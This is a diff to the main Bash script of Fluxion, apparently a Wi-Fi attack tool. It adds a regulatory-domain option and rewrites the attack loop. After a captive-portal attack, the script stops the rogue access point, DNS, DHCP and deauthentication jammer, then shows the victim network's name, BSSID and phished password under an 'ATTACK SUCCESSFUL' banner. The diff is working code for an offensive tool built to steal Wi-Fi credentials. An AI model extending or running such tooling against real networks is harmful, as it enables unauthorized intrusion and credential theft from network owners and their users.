@@ -22,7 +22,7 @@ readonly FLUXIONNoiseFloor=-90
 readonly FLUXIONNoiseCeiling=-60
 
 readonly FLUXIONVersion=6
-readonly FLUXIONRevision=21
+readonly FLUXIONRevision=22
 
 # Declare window ration bigger = smaller windows
 FLUXIONWindowRatio=4
@@ -112,7 +112,7 @@ source "$FLUXIONLibPath/WindowUtils.sh"
 # ============================================================ #
 if ! FLUXIONCLIArguments=$(
     getopt --options="vdk5rinmthb:e:c:l:a:r" \
-      --longoptions="debug,debug-log:,version,killer,5ghz,installer,reloader,help,airmon-ng,multiplexer,target,test,auto,bssid:,essid:,channel:,language:,attack:,ratio,skip-dependencies,scan-time:,scan-only,list-interfaces,interface:,jammer-interface:,ap-interface:,tracker-interface:,ap-service:,timeout:" \
+      --longoptions="debug,debug-log:,version,killer,5ghz,installer,reloader,help,airmon-ng,multiplexer,target,test,auto,bssid:,essid:,channel:,language:,attack:,ratio,skip-dependencies,scan-time:,scan-only,list-interfaces,interface:,jammer-interface:,ap-interface:,tracker-interface:,ap-service:,timeout:,reg-domain:" \
       --name="FLUXION V$FLUXIONVersion.$FLUXIONRevision" -- "$@"
   ); then
   echo -e "${CRed}Aborted$CClr, parameter error detected..."; exit 5
@@ -164,6 +164,7 @@ while [ "$1" != "" ] && [ "$1" != "--" ]; do
     --tracker-interface) FLUXIONTrackerInterface=$2; shift;;
     --ap-service) FLUXIONAPService=$2; shift;;
     --timeout) FLUXIONTimeout=$2; shift;;
+    --reg-domain) FLUXIONRegDomain=${2^^}; shift;;
   esac
   shift # Shift new parameters
 done
@@ -2549,6 +2550,7 @@ fluxion_run_attack() {
   # watcher does not immediately exit on a fresh attack cycle.
   rm -f "$FLUXIONWorkspacePath/status.txt" \
         "$FLUXIONWorkspacePath/authenticator_success.flag" \
+        "$FLUXIONWorkspacePath/handshake_success.flag" \
         2>/dev/null
 
   start_attack
@@ -2613,12 +2615,54 @@ fluxion_run_attack() {
     # This keeps us in normal code flow (no signal tricks) so that the
     # success display in fluxion_handle_exit works as a plain function call.
     local _attackSucceeded=0
+    local _handshakeNotified=0
+    local _captiveNotified=0
     while true; do
-      if [ -f "$FLUXIONWorkspacePath/status.txt" ] || \
-         [ -f "$FLUXIONWorkspacePath/authenticator_success.flag" ]; then
-        _attackSucceeded=1
-        IOQueryChoice="${choices[1]}"
-        break
+      # Handshake Snooper: arbiter daemon writes this flag on success.
+      # Redraw once with a success notice; then keep waiting for the user
+      # to choose the next step (another attack or exit).
+      if [ $_handshakeNotified -eq 0 ] && \
+         [ -f "$FLUXIONWorkspacePath/handshake_success.flag" ]; then
+        _handshakeNotified=1
+        rm -f "$FLUXIONWorkspacePath/handshake_success.flag"
+        fluxion_header
+        echo -e "$FLUXIONVLine $HandshakeSnooperArbiterSuccededNotice"
+        echo
+        _ci=1
+        for _c in "${choices[@]}"; do
+          echo -e "\t${CRed}[${CSYel}${_ci}${CClr}${CRed}]${CClr} ${_c}${CClr}"
+          _ci=$((_ci + 1))
+        done
+        echo
+        echo -ne "$IOUtilsPrompt"
+      fi
+      # Captive Portal: authenticator writes status.txt when credentials are
+      # verified. Stop all attack services immediately (rogue AP, DNS, DHCP,
+      # web server, deauth jammer), then redraw showing the credentials and
+      # wait for the user to choose the next step.
+      if [ $_captiveNotified -eq 0 ] && \
+         [ -f "$FLUXIONWorkspacePath/status.txt" ]; then
+        _captiveNotified=1
+        fluxion_target_tracker_stop
+        stop_attack
+        local _captivePwd
+        _captivePwd=$(cat "$FLUXIONWorkspacePath/candidate.txt" 2>/dev/null)
+        fluxion_header
+        echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
+        echo -e "  ${CSGrn}|           ATTACK SUCCESSFUL                   |${CClr}"
+        echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
+        echo -e "  ${CGrn}  Network  :${CClr} ${CSWht}$FluxionTargetSSID${CClr}"
+        echo -e "  ${CGrn}  BSSID    :${CClr} ${CSWht}$FluxionTargetMAC${CClr}"
+        echo -e "  ${CYel}  Password :${CClr} ${CSYel}$_captivePwd${CClr}"
+        echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
+        echo
+        _ci=1
+        for _c in "${choices[@]}"; do
+          echo -e "\t${CRed}[${CSYel}${_ci}${CClr}${CRed}]${CClr} ${_c}${CClr}"
+          _ci=$((_ci + 1))
+        done
+        echo
+        echo -ne "$IOUtilsPrompt"
       fi
       local _inp=""
       if read -t 1 -r _inp 2>/dev/null && [ -n "$_inp" ]; then
